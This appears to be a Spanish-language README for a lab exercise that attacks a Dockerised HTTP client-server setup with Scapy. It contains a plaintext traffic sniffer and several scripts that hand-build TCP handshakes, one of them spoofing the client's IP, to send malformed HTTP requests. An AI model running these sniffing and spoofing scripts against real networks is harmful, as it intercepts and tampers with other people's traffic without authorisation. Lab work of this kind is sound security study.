# Atacando la conexion Cliente-Servidor con Scapy
## 📌Descripcion:
En esta ocasion se busca atacar la conexion Cliente-Servidor creada anteriormente con el fin de comprobar las vulnerabilidades de HTTP
## ¿Que vulnerabilidades tiene HTTP?
HTTP tiene varias vulnerabilidades porque no cifra los datos, lo que permite ataques de intercepción como el sniffing. Es susceptible a ataques de intermediario (MITM), donde un atacante puede modificar la información en tránsito. También permite suplantación de identidad, ya que no verifica la autenticidad del emisor. Además, es vulnerable a inyecciones si no se validan correctamente las entradas del usuario.
## ¿Que es Scapy?
Scapy es una herramienta de Python para crear, enviar, capturar y manipular paquetes de red.
## Estructura del pryoecto
<pre> ```text +---------------------------------------------------+ +-------------+ | PC 2 | | PC 1 | | Cliente (contenedor) Atacante (host físico)| | Servidor | | +----------------------+ +------------------+ | | | | | cliente.py | | sniff.py | | | Apache | | | Dockerfile | | mod1.py | | | index.html | | +----------------------+ | mod2.py | | | Dockerfile | | | in1.py | | +-------------+ | | in2.py | | | | in3.py | | | +------------------+ | +---------------------------------------------------+ HTTP GET --------------------------> (modificada o no) <------------------------ ``` </pre>
## ⚠️ Advertencia: Este proyecto debe ejecutarse únicamente en entornos de prueba o laboratorio controlado. Su uso en redes reales o de producción sin autorización puede ser ilegal y conllevar consecuencias graves.
## Antes de comenzar:
Primero se debe comprobar que los contenedores de cliente y servidor esten corriendo
```
sudo docker ps -a
```
## 🛠️ Configuración atacante
### 💻 PC 2 (Atacante con Scapy ):
#### Sniff.py
```
from scapy.all import sniff, TCP, IP, Raw

ip_cliente = "172.16.30.103"  
ip_servidor = "172.16.30.64"  
puerto_servidor = 8080  

def packet_callback(packet):

    if packet.haslayer(TCP) and packet.haslayer(Raw):
        ip_layer = packet[IP]
        tcp_layer = packet[TCP]
        data = packet[Raw].load


        if (ip_layer.src == ip_cliente and ip_layer.dst == ip_servidor and tcp_layer.dport == puerto_servidor) or \
           (ip_layer.src == ip_servidor and ip_layer.dst == ip_cliente and tcp_layer.sport == puerto_servidor):
            print(f"Paquete {ip_layer.src}:{tcp_layer.sport} -> {ip_layer.dst}:{tcp_layer.dport}")
            try:
                print(data.decode('utf-8', errors='ignore')) 
            except:
                print("No se pudo decodificar")


sniff(filter="tcp port 8080", prn=packet_callback, store=False)
```
#### in1.py
```
from scapy.all import IP, TCP, send, sr1

ip_dst = "172.16.30.64"
port_dst = 8080
port_src = 12345  

ip = IP(dst=ip_dst)
SYN = TCP(sport=port_src, dport=port_dst, flags="S", seq=1000)
SYN_ACK = sr1(ip/SYN)
ACK = TCP(sport=port_src, dport=port_dst, flags="A", seq=SYN.seq+1, ack=SYN_ACK.seq+1)
send(ip/ACK)


payload = b"FUZZ / HTTP/1.1\r\nHost: 172.16.30.64\r\n\r\n"
send(ip/TCP(sport=port_src, dport=port_dst, flags="PA", seq=ACK.seq, ack=ACK.ack)/payload)
```
#### in2.py
```
from scapy.all import IP, TCP, send, sr1

ip_cliente = "172.16.30.103"
ip_servidor = "172.16.30.64"
puerto_servidor = 8080
puerto_cliente = 12345 


ip = IP(src=ip_cliente, dst=ip_servidor)
SYN = TCP(sport=puerto_cliente, dport=puerto_servidor, flags="S", seq=1000)
SYN_ACK = sr1(ip/SYN)  
ACK = TCP(sport=puerto_cliente, dport=puerto_servidor, flags="A", seq=SYN.seq + 1, ack=SYN_ACK.seq + 1)
send(ip/ACK)  


long_path = b"/" + b"G" * 1500
payload = b"GET " + long_path + b" HTTP/1.1\r\nHost: 172.16.30.64\r\n\r\n"

send(ip/TCP(sport=puerto_cliente, dport=puerto_servidor, flags="PA", seq=ACK.seq, ack=ACK.ack)/payload)

print("Inyección 2 enviada: petición con path largo.")
```
#### mod1.py
``` 
from scapy.all import *

target_ip = "172.16.30.64"
target_port = 8080

def tcp_handshake():
    sport = RandShort()
    ip = IP(dst=target_ip)
    syn = TCP(sport=sport, dport=target_port, flags='S', seq=1000)
    synack = sr1(ip/syn, timeout=2, verbose=0)
    if not synack:
        print("No se recibió SYN-ACK")
        return None, None
    ack = TCP(sport=sport, dport=target_port, flags='A', seq=1001, ack=synack.seq + 1)
    send(ip/ack, verbose=0)
    return ip, sport

def send_fin_only(ip, sport):
    payload = (
        "GET / HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        "User-Agent: mod-tcp-fin\r\n"
        "Connection: close\r\n\r\n"
    )
    tcp = TCP(sport=sport, dport=target_port, flags='F', seq=1001, ack=1)
    packet = ip/tcp/Raw(load=payload)
    send(packet, verbose=0)
    print("[+] Paquete TCP con flag FIN solo enviado.")

def main():
    ip, sport = tcp_handshake()
    if not ip:
        print("Error al establecer conexión TCP")
        return
    send_fin_only(ip, sport)

if __name__ == "__main__":
    main()
```
#### mod2.py
```
from scapy.all import *

target_ip = "172.16.30.64"
target_port = 8080

def tcp_handshake():
    sport = RandShort()
    ip = IP(dst=target_ip)
    syn = TCP(sport=sport, dport=target_port, flags='S', seq=1000)
    synack = sr1(ip/syn, timeout=2, verbose=0)
    if not synack:
        print("No se recibió SYN-ACK")
        return None, None
    ack = TCP(sport=sport, dport=target_port, flags='A', seq=1001, ack=synack.seq + 1)
    send(ip/ack, verbose=0)
    return ip, sport

def send_bad_host(ip, sport):
    payload = (
        "GET / HTTP/1.1\r\n"
        "Host: invalid_host!@#\r\n"
        "User-Agent: mod-bad-host\r\n"
        "Connection: close\r\n\r\n"
    )
    tcp = TCP(sport=sport, dport=target_port, flags='PA', seq=1001, ack=1)
    packet = ip/tcp/Raw(load=payload)
    send(packet, verbose=0)
    print("[+] Paquete HTTP con Host inválido enviado.")

def main():
    ip, sport = tcp_handshake()
    if not ip:
        print("Error al establecer conexión TCP")
        return
    send_bad_host(ip, sport)

if __name__ == "__main__":
    main()
```
#### mod3.py
```
from scapy.all import *

target_ip = "172.16.30.64"
target_port = 8080

def tcp_handshake():
    sport = RandShort()
    ip = IP(dst=target_ip)
    syn = TCP(sport=sport, dport=target_port, flags='S', seq=1000)
    synack = sr1(ip/syn, timeout=2, verbose=0)
    if not synack:
        print("No se recibió SYN-ACK")
        return None, None
    ack = TCP(sport=sport, dport=target_port, flags='A', seq=1001, ack=synack.seq + 1)
    send(ip/ack, verbose=0)
    return ip, sport

def send_bad_content_length(ip, sport):
    body = "Este es un cuerpo más largo que el indicado."
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        "User-Agent: mod-bad-content-length\r\n"
        "Content-Length: 10\r\n" 
        "Connection: close\r\n\r\n" +
        body
    )
    tcp = TCP(sport=sport, dport=target_port, flags='PA', seq=1001, ack=1)
    packet = ip/tcp/Raw(load=payload)
    send(packet, verbose=0)
    print("[+] Paquete HTTP con Content-Length incorrecto enviado.")

def main():
    ip, sport = tcp_handshake()
    if not ip:
        print("Error al establecer conexión TCP")
        return
    send_bad_content_length(ip, sport)

if __name__ == "__main__":
    main()
```
### ⚙️ COMANDOS PARA EJECUTAR:
```
sudo python3 <script_a_ejecutar.py>
```
### 📂 Estructura del repositorio:
```
.
├── Atacante/
│   ├── sniff.py
    └── in1.py
    └── in2.py
    └── mod1.py
    └── mod2.py
    └── mod3.py
```
